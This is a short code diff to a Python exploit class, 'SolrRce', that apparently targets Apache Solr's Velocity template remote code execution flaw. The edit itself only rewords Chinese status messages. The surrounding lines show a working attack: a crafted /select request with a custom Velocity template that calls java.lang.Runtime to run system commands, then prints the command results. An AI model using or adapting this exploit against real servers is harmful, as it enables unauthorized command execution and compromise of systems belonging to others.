@@ -64,7 +64,7 @@ class SolrRce:
             sys.exit(0)
 
         else:
-            cprint('[*] 修改core name配置成功，尝试系统命令注入', 'yellow')
+            cprint('[*] 修改core name配置成功，尝试执行系统命令', 'yellow')
             exp_code1 = "/select?q=1&&wt=velocity&v.template=custom&v.template.custom="
 
             exp_code2 = "#set($x='') #set($rt=$x.class.forName('java.lang.Runtime')) " \
@@ -80,7 +80,7 @@ class SolrRce:
             }
             cmd_result = requests.get(end_url, headers=header)
             if cmd_result.status_code == 500:
-                cprint('[-] URL: %s 系统命令注入失败' % self.url, 'yellow', 'on_red')
+                cprint('[-] URL: %s 系统命令执行失败' % self.url, 'yellow', 'on_red')
             else:
                 cprint('[*] 命令执行结果: \n %s' % cmd_result.text, 'yellow')
 
